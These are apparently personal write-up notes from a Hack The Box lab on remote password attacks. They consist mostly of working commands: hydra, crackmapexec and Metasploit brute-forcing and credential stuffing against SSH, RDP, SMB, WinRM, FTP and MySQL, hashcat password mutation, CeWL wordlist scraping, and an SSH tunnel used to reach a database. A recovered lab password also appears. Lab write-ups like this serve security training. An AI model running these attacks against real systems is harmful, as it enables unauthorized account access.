# ☄️ Remote Password Attacks

## Network Services

{% content-ref url="../../../interacting-with-protocols-and-tools/tools/crackmapexec.md" %}
[crackmapexec.md](../../../interacting-with-protocols-and-tools/tools/crackmapexec.md)
{% endcontent-ref %}

```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

{% content-ref url="../../../interacting-with-protocols-and-tools/tools/winrm.md" %}
[winrm.md](../../../interacting-with-protocols-and-tools/tools/winrm.md)
{% endcontent-ref %}

{% content-ref url="../../../interacting-with-protocols-and-tools/protocols/ssh.md" %}
[ssh.md](../../../interacting-with-protocols-and-tools/protocols/ssh.md)
{% endcontent-ref %}

```shell-session
 hydra -L user.list -P password.list ssh://10.129.42.197
```

{% content-ref url="../../../interacting-with-protocols-and-tools/protocols/rdp.md" %}
[rdp.md](../../../interacting-with-protocols-and-tools/protocols/rdp.md)
{% endcontent-ref %}

```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```

Connect through xfreerdp:

```shell-session
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

{% content-ref url="../../../interacting-with-protocols-and-tools/protocols/smb.md" %}
[smb.md](../../../interacting-with-protocols-and-tools/protocols/smb.md)
{% endcontent-ref %}

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```

we may also get the following error describing that the server has sent an invalid reply.

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

```shell-session
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run
```

## Password Mutations

Considering that many people want to keep their passwords as simple as possible despite password policies, we can create rules for generating weak passwords.

We can use a very powerful tool called [Hashcat](https://hashcat.net/hashcat/) to combine lists of potential names and labels with specific mutation rules to create custom wordlists.

```shell-session
ElFelixi0@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
ElFelixi0@htb[/htb]$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
<SNIP>
```

We can also create a wordlist based on potential words from the company's website and save them in a separate list with [CeWL](https://github.com/digininja/CeWL)

```shell-session
ElFelixi0@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

_**Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.**_

```
hydra -l sam -P batman.txt ftp://10.129.194.9
```

<figure><img src="../../../.gitbook/assets/image (1453).png" alt=""><figcaption><p>B@tm@n2022!</p></figcaption></figure>

Here is a list of known default credentials [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).

Hydra syntax to try credential stuffing ->

```shell-session
hydra -C <user_pass.list> <protocol>://<IP>
hydra -C user_pass.list ssh://10.129.42.197
```

_**Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer.**_ (Format: :)

I first get the list ->

```
wget https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv
```

Then i adapt the content of the list to mysql ->

```
grep -i 'mysql' DefaultCreds-Cheat-Sheet.csv > cred.list
```

Then i manually change the list to fit to the template used for password username:password ->

```
admin@example.com:admin
root:<blank>
root:root
superdba:admin
scrutremote:admin
```

then i forward the ssh connection ->

```
ssh -L 4444:localhost:3306 sam@10.129.194.9
```

then i open new tab and launch the following with my msql list ->

```
hydra -C mysqldflt.txt mysql://localhost:4444
```

<figure><img src="../../../.gitbook/assets/image (1454).png" alt=""><figcaption></figcaption></figure>
